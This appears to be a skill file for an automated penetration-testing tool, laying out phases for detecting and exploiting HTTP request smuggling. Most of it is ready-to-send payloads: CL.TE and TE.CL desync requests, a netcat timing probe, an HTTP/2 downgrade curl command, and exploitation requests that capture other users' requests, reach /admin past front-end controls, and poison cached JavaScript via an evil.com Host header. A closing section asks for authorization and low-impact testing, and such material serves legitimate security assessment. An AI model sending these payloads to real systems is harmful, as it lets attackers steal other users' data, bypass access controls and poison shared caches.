---
name: attack-request-smuggling
description: "Assess HTTP request-boundary parsing differences using explicitly authorized, low-impact desynchronization checks"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - request-smuggling
  - http-desync
  - web
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-444
chains_with:
  - attack-cache-poison
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-cache-poison: "Smuggling + cache = stored XSS/redirect for all users"
---

# HTTP Request Smuggling

## Objective

Exploit disagreements between front-end and back-end servers on request boundary parsing (Content-Length vs Transfer-Encoding) to smuggle a second request.

## Testing Methodology

### Phase 1: Detect Smuggling

**CL.TE (front uses Content-Length, back uses Transfer-Encoding):**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL (front uses Transfer-Encoding, back uses Content-Length):**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### Phase 2: Timing-Based Detection

Send ambiguous request, measure response time:
- If back-end times out waiting for more data → smuggling may be possible

```bash
# CL.TE detection (timeout = vulnerable)
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' | timeout 10 nc TARGET 80
```

### Phase 3: Confirm Smuggling

**CL.TE confirmed:**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404-proof HTTP/1.1
X: x
```

If next request to `/` returns 404 or different page, smuggling is confirmed.

### Phase 4: Exploitation

**Capture other user's request:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Content-Length: 10000
Content-Type: application/x-www-form-urlencoded

data=
```
Next user's request is appended to `data=` parameter.

**Bypass front-end access controls:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X: x
```

**Cache poisoning via smuggling:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 100
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: evil.com
X: x
```

### Phase 5: H2.CL / H2 Smuggling

```bash
# HTTP/2 downgrade smuggling
curl --max-time 15 --connect-timeout 5 --http2 https://TARGET/ \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Request smuggling → capture user requests | Critical (P1) |
| Smuggling → admin access bypass | Critical (P1) |
| Smuggling → cache poisoning | Critical (P1) |
| CL.TE or TE.CL desync confirmed | High (P2) |

## Evidence Requirements

- Smuggling variant (CL.TE, TE.CL, TE.TE, H2.CL)
- Proof of desync (wrong response, timing, captured request)
- Impact demonstration (auth bypass, cache poison, request capture)

## Verification and Safe-Testing Gate

- Request smuggling can affect other users and shared connections. Test only when the program explicitly permits desynchronization testing; prefer a dedicated test environment or isolated connection.
- Begin with passive protocol/header observations and low-impact probes. Do not use payloads designed to poison real users' responses, bypass authentication for other users, or cause persistent queue desynchronization.
- A timeout, 400/403 response, or connection close is not sufficient proof. Correlate front-end/back-end behavior and demonstrate a reproducible parsing discrepancy with a harmless marker.
- Avoid high concurrency and stop immediately if unrelated responses appear, connections become unstable, or another user's request could be affected.
- Treat cache poisoning and authorization impact as separate findings unless you independently demonstrate the chain. Link to `attack-cache-poison` only when a clean request receives a poisoned shared response.
## References

- [PortSwigger: Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [James Kettle: HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
